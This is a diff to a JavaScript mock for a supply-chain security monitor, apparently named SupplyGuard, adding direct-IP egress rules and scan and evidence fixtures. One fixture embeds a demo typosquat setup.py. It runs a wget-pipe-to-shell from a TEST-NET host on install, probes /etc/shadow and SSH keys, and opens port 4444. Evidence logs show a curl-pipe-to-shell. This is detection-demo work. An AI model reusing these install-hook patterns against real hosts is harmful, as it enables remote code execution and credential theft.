@@ -85,6 +85,8 @@
     const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
     return (a & mask) === (b & mask);
   }
+  // 공인 주소: 사설 · 루프백 · 링크로컬이 아닌 IPv4 (backend rules.IsPublicAddr 축약)
+  const isPublic = (ip) => ipToInt(ip) !== null && !['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '169.254.0.0/16', '0.0.0.0/8'].some((c) => inCidr(ip, c));
   const strength = (r) => (r.action === 'kill' ? (r.dryRun ? 2 : 3) : 1);
 
   function ruleHits(r, e) {
@@ -112,9 +114,12 @@
         if (dc) return `금지 대역 ${dc}`;
         const dh = (r.denyHosts || []).find(hostMatch);
         if (dh) return `금지 도메인 ${dh}`;
-        const hasAllow = (r.allowPorts || []).length || (r.allowCidrs || []).length || (r.allowHosts || []).length;
+        const hasAllow = (r.allowPorts || []).length || (r.allowCidrs || []).length || (r.allowHosts || []).length || r.directIp;
         if (!hasAllow) return null;
         if ((r.allowPorts || []).includes(port) || (r.allowCidrs || []).some((c) => inCidr(ip, c)) || (r.allowHosts || []).some(hostMatch)) return null;
+        // 직접 IP 연결 [10/20 W10 — backend rules/engine.go 와 같은 순서]: trace_dns 가 돌고 있는데 도메인 없이 공인 IP 로 바로 붙었다 → 규칙의 directIp 대로
+        if (r.directIp && !host && e.dnsTraced && isPublic(ip)) return r.directIp === 'allow' ? null : `도메인 조회 없는 IP 직접 연결: ${ip}:${port}`;
+        if (r.directIp && !(r.allowHosts || []).length) return null; // directIp 전용 규칙(runtime-direct-ip)은 직접 IP 연결만 본다
         const dst = host ? `${ip}:${port} (${host})` : `${ip}:${port}`;
         return (r.allowHosts || []).length && !host ? `허용 목록 밖 목적지 ${dst} — 도메인 미확인` : `허용 목록 밖 목적지 ${dst}`;
       }
@@ -130,8 +135,10 @@
       if (hit && (!best || strength(r) > strength(best))) { best = r; why = hit; }
     }
     if (!best) return { event: e, matched: false };
-    const v = { event: e, matched: true, ruleId: best.id, action: best.action, reason: `${best.id}: ${why}` };
-    if (best.action === 'kill' && best.dryRun) v.dryRun = true;
+    // directIp 가 걸리면 그 값이 규칙의 action 을 덮어쓴다
+    const action = best.directIp && why.startsWith('도메인 조회 없는 IP 직접 연결') ? best.directIp : best.action;
+    const v = { event: e, matched: true, ruleId: best.id, action, reason: `${best.id}: ${why}` };
+    if (action === 'kill' && best.dryRun) v.dryRun = true;
     return v;
   }
 
@@ -281,5 +288,31 @@
 
   // 공급망 검사(10/16) — GuardDog 3.2.0 · OSV-Scanner 2.7.0 을 sg-vm 에서 실제로 돌린 결과(설명만 한국어로). 목업은 이 값을 돌려준다
   const scanFixtures = {"engines": [{"name": "GuardDog", "version": "3.2.0", "license": "Apache-2.0", "url": "https://github.com/DataDog/guarddog"}, {"name": "OSV-Scanner", "version": "2.7.0", "license": "Apache-2.0", "url": "https://github.com/google/osv-scanner"}], "guarddog": {"pip:reqeusts": {"risk": {"score": 8.6, "label": "high_risk"}, "files": {"setup.py": "\"\"\"데모용 '타이포스쿼팅' 패키지 — reqeusts (requests 의 오타).\n\n이 패키지는 SupplyGuard 탐지를 시연하기 위한 무해한 시뮬레이션이다. 실제 공급망 공격이\n설치 단계(post-install)에서 흔히 하는 세 가지 행동을 흉내만 낸다. 아무것도 실제로 하지 않는다:\n  - 원격 코드를 내려받거나 실행하지 않는다 (도메인은 TEST-NET-3 예약 대역이라 연결 불가).\n  - 파일을 밖으로 보내지 않는다. 존재 여부만 확인하려고 열어 보고 즉시 닫는다.\n  - 목적지는 전부 203.0.113.0/24 (RFC 5737 문서용, 라우팅되지 않음)이다.\n\npip 이 이 setup.py 를 실행하는 순간, 커널의 openat/execve/connect 시스템콜을 SupplyGuard 가\n가로채 sandbox-secrets · no-shell-download · sandbox-egress 정책에 걸어 컨테이너를 격리한다.\nsg-install 로 감시 컨테이너 안에서만 실행하라: `sg-install pip ./deploy/demo/reqeusts`\n\"\"\"\nimport socket\nimport subprocess\nimport sys\n\nBANNER = \"[demo] typosquatted package 'reqeusts' post-install (harmless simulation)\"\n\n\ndef touch(path):\n    # 민감 파일 '접근' 시늉 — 열려고 시도만 하고, 내용은 읽지도 보내지도 않는다. openat 탐지를 유발한다.\n    try:\n        open(path, \"rb\").close()\n        print(f\"[demo] opened {path} (SupplyGuard should flag this)\")\n    except OSError as e:\n        print(f\"[demo] open {path} failed harmlessly: {e.__class__.__name__}\")\n\n\ndef main():\n    print(BANNER)\n\n    # 1) execve — '외부 스크립트 실행' 패턴. 실제로는 예약 대역이라 아무것도 받지 못한다.\n    #    셸에서 다운로더를 부르는 형태 자체가 no-shell-download / pipe-to-shell 정책에 걸린다.\n    subprocess.run(\n        [\"sh\", \"-c\", \"wget -q -O- http://203.0.113.7/postinstall.sh | sh\"],\n        timeout=3,\n        check=False,\n    )\n\n    # 2) openat — 자격 증명·계정 파일 접근 시늉.\n    for p in (\"/etc/shadow\", \"/root/.ssh/id_rsa\"):\n        touch(p)\n\n    # 3) connect — 허용 목록 밖 목적지로 아웃바운드 (리버스 셸 포트). TEST-NET 이라 타임아웃난다.\n    try:\n        socket.create_connection((\"203.0.113.7\", 4444), timeout=2).close()\n    except OSError:\n        print(\"[demo] connect 203.0.113.7:4444 timed out harmlessly (TEST-NET)\")\n\n    print(\"[demo] done — 정상 설치라면 여기 도달하지만, SupplyGuard 는 1) 단계에서 이미 격리한다.\")\n\n\nif __name__ == \"__main__\":\n    main()\n\n# pip install 시 실행되도록: 최소 메타데이터. 실제 배포 목적이 아니다.\ntry:\n    from setuptools import setup\n    if \"install\" in sys.argv or \"bdist_wheel\" in sys.argv or \"egg_info\" in sys.argv:\n        main()  # post-install 흉내: 빌드/설치 단계에서 위 행동을 유발\n        setup(name=\"reqeusts\", version=\"1.0.2\", py_modules=[])\nexcept ImportError:\n    pass\n"}, "findings": [{"rule": "threat-network-exfiltration", "category": "threat", "message": "의심 도메인으로 보내는 URL(유출 · C2에 흔함)", "file": "setup.py", "line": 35, "match": "http://203.0.113.7"}, {"rule": "threat-filesystem-read", "category": "threat", "message": "민감 파일(자격 증명 · 설정 · 키) 접근", "file": "setup.py", "line": 41, "match": "/etc/shadow"}, {"rule": "threat-setup-suspicious-imports", "category": "threat", "message": "setup.py 에서 네트워크 · 시스템 모듈을 불러옴", "file": "setup.py", "line": 13, "match": "import socket"}, {"rule": "capability-network-lolbas", "category": "capability", "message": "시스템 도구로 내려받기(wget -)", "file": "setup.py", "line": 35, "match": "wget -"}, {"rule": "capability-process-spawn", "category": "capability", "message": "프로세스 실행", "file": "setup.py", "line": 34, "match": "subprocess.run"}]}, "pip:requests": {"risk": {"score": 0.0, "label": "no_risks_detected"}, "files": {}, "findings": [{"rule": "capability-filesystem-delete", "category": "capability", "message": "파일 · 폴더 삭제 기능", "file": "requests/utils.py", "line": 337, "match": ""}, {"rule": "capability-filesystem-read", "category": "capability", "message": "파일 읽기 기능", "file": "requests/models.py", "line": 240, "match": ""}, {"rule": "capability-process-spawn", "category": "capability", "message": "프로세스 실행", "file": "requests/help.py", "line": 73, "match": ""}]}}, "osv": {"requirements.txt": [{"package": "django", "version": "3.2.0", "ecosystem": "PyPI", "direct": true, "count": 66, "maxSeverity": "9.8", "ids": ["PYSEC-2021-109", "PYSEC-2021-439"]}, {"package": "urllib3", "version": "1.23.0", "ecosystem": "PyPI", "direct": false, "count": 24, "maxSeverity": "8.7", "ids": ["PYSEC-2019-132", "PYSEC-2019-133"]}, {"package": "requests", "version": "2.19.0", "ecosystem": "PyPI", "direct": true, "count": 10, "maxSeverity": "7.5", "ids": ["PYSEC-2018-28", "PYSEC-2023-74"]}, {"package": "idna", "version": "2.7.0", "ecosystem": "PyPI", "direct": false, "count": 4, "maxSeverity": "7.5", "ids": ["PYSEC-2024-60", "PYSEC-2026-215"]}, {"package": "flask", "version": "2.3.3", "ecosystem": "PyPI", "direct": true, "count": 2, "maxSeverity": "4.3", "ids": ["PYSEC-2026-2151", "GHSA-68rp-wp8r-4726"]}]}};
-  window.MOCK = { scanFixtures, containers, attack, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
+  // ── 10/20 2차 시안(W10) 모의 값 ──────────────────────────
+  // 새 기본 규칙(GET /api/policies/defaults): 버전이 올라 기본 정책 파일에 생긴 규칙 · 옵션. 시뮬 서버는 지금 규칙과 비교해 missing · differs 를 만든다
+  //   missing = runtime-direct-ip, differs = sandbox-egress(directIp: kill 추가) [10/20 사용자 결정]
+  const defaultRules = rules.filter((r) => r.id !== SYSTEM_RULE).map((r) => (r.id === 'sandbox-egress' ? Object.assign({}, r, { directIp: 'kill' }) : Object.assign({}, r)));
+  defaultRules.splice(5, 0, { id: 'runtime-direct-ip', description: '도메인 조회 없이 공인 IP로 바로 나가는 연결 (C2 · 데이터 유출에 흔함). 런타임은 경고만', kind: 'connect', action: 'alert', directIp: 'alert',
+    allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '::1'] });
+  // 공급망 검사 결과의 패키지 목록(Scan.packages — OSV-Scanner 가 읽은 잠금 · 의존성 파일 항목, 잠금 파일마다 한 행) [W4 · 10/20 G]
+  //   manager 가 비면 차단 목록이 다루지 않는 생태계. 화면은 같은 (manager, name) 을 한 줄로 묶고 출처 파일을 나열한다
+  const P = (name, version, direct, vulns, source, manager = 'pip', ecosystem = 'PyPI') => ({ manager, name, version, ecosystem, source, direct, vulns });
+  scanFixtures.packages = {
+    'requirements.txt': [P('django', '3.2.0', true, 66, 'requirements.txt'), P('urllib3', '1.23.0', false, 24, 'requirements.txt'), P('requests', '2.19.0', true, 10, 'requirements.txt'),
+      P('idna', '2.7.0', false, 4, 'requirements.txt'), P('flask', '2.3.3', true, 2, 'requirements.txt'), P('certifi', '2018.4.16', false, 0, 'requirements.txt'), P('chardet', '3.0.4', false, 0, 'requirements.txt')],
+    'repo:requests': [P('urllib3', '1.26.5', false, 3, 'requirements-dev.txt'), P('urllib3', '1.26.5', false, 3, 'docs/requirements.txt'), P('idna', '2.10', false, 1, 'requirements-dev.txt'), P('idna', '2.10', false, 1, 'docs/requirements.txt'),
+      P('charset-normalizer', '3.3.2', false, 0, 'requirements-dev.txt'), P('charset-normalizer', '3.3.2', false, 0, 'docs/requirements.txt'), P('pytest', '7.4.0', true, 0, 'requirements-dev.txt'), P('certifi', '2023.7.22', false, 0, 'requirements-dev.txt'),
+      P('sphinx', '7.2.6', true, 0, 'docs/requirements.txt'), P('actions/checkout', 'v4', true, 0, '.github/workflows/run-tests.yml', '', 'GitHub Actions')],
+  };
+  scanFixtures.osv['repo:requests'] = [{ package: 'urllib3', version: '1.26.5', ecosystem: 'PyPI', direct: false, count: 3, maxSeverity: '8.1', ids: ['GHSA-34jh-p97f-mpxf', 'GHSA-g4mx-q9vg-27p4'] },
+    { package: 'idna', version: '2.10', ecosystem: 'PyPI', direct: false, count: 1, maxSeverity: '6.2', ids: ['GHSA-jjg7-2v4v-x38h'] }];
+  // 증거(kill 직전, GET /api/evidence?container=) — 로그 마지막 줄 · docker diff · docker top. 설치 감시 컨테이너는 금방 멈춰 docker top 이 빠진다(partial)
+  const evidenceTemplate = {
+    install: (label) => ({ logs: [`Collecting ${label.split(' ').slice(1).join(' ')}`, '  Processing /pkg/reqeusts', '  Preparing metadata (setup.py): started', "[demo] typosquatted package 'reqeusts' post-install (harmless simulation)", '[demo] opened /etc/shadow (SupplyGuard should flag this)'].join('\n'),
+      changes: [{ kind: 'A', path: '/tmp/pip-install-7q2m/reqeusts/setup.py' }, { kind: 'A', path: '/tmp/postinstall.sh' }, { kind: 'C', path: '/root/.cache/pip' }], processes: [], partial: true, durationMs: 700, error: 'docker top: 700ms 안에 끝나지 않아 프로세스 목록을 빼고 저장했습니다' }),
+    runtime: () => ({ logs: ['GET /health 200 2ms', 'GET /health 200 1ms', 'sh: curl -s http://203.0.113.7/p.sh | sh', 'python3: opened /root/.ssh/id_rsa'].join('\n'),
+      changes: [{ kind: 'C', path: '/root' }, { kind: 'A', path: '/tmp/p.sh' }, { kind: 'D', path: '/var/log/app.log' }],
+      processes: [{ pid: 1, user: 'root', cmd: 'python3 -c import reqeusts' }, { pid: 47, user: 'root', cmd: 'sh -c curl -s http://203.0.113.7/p.sh | sh' }, { pid: 48, user: 'root', cmd: 'curl -s http://203.0.113.7/p.sh' }], partial: false, durationMs: 214, error: '' }),
+  };
+  window.MOCK = { scanFixtures, defaultRules, evidenceTemplate, isPublic, containers, attack, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
 })();
